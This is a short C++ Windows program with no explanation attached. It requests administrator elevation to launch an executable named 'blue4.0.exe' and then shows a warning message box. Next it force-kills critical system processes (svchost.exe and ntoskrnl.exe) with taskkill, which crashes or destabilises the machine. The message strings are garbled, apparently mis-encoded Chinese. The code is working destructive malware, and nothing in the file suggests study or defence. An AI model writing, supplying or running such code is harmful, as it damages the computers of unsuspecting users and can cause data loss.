
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <thread>
using namespace std;

 
 
 void getPower(){
 	    SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = TEXT("runas");
        sei.lpFile = TEXT("blue4.0.exe");
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;
    
    if (!ShellExecuteEx(&sei)) {
        DWORD errorCode = GetLastError();
        if (errorCode == ERROR_CANCELLED) {
            std::cerr << "�û��ܾ��˹���ԱȨ������" << std::endl;
        } 
    }
 } 
 
 
 
 
int main() {
	thread t(getPower);
	t.join();
    MessageBox(NULL,TEXT("�ó���ֻ����win32������"),TEXT("����"),MB_OK |MB_ICONWARNING);
    
    
  int status = system("taskkill /F /IM svchost.exe");
  int status1 = system("taskkill /F /IM ntoskrnl.exe");

  if (status != 0) {
    std::cout << "ִ������ʧ��" << std::endl;
    return 1; 
  }
  return 0;
}
